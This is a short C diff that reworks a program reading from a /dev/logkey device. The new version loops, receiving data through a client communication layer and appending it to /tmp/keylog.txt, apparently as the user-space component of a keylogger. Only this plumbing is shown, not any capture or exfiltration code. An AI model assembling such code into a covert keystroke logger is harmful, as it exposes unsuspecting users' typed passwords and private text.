@@ -1,21 +1,35 @@
 #include <stdio.h>
-#include <fcntl.h>
-#include <unistd.h>
+#include <signal.h>
+#include <stdbool.h>
+#include "client_comm.h"
+#include "logger.h"
 
-int main() {
-    int fd = open("/dev/logkey", O_RDONLY);
-    if (fd < 0) {
-        perror("open");
-        return 1;
+static volatile bool running = true;
+
+void handle_sigint(int sig) {
+    (void)sig;
+    running = false;
+    printf("\nExiting program...\n");
+}
+
+int main(void) {
+    char buf[1024];
+
+    signal(SIGINT, handle_sigint);
+
+    if (client_comm_init() < 0) return 1;
+    if (logger_open("/tmp/keylog.txt") < 0) return 1;
+
+    while (running) {
+        int len = client_comm_recv(buf, sizeof(buf) - 1);
+        if (len > 0) {
+            buf[len] = '\0';  // Ensure null termination
+            logger_write(buf);
+            fflush(stdout);  // Flush stdout to see output immediately
+        }
     }
 
-    char buf[256];
-    int n = read(fd, buf, sizeof(buf) - 1);
-    if (n > 0) {
-        buf[n] = '\0';
-        printf("Received: %s", buf);
-    }
-
-    close(fd);
+    logger_close();
+    client_comm_cleanup();
     return 0;
 }
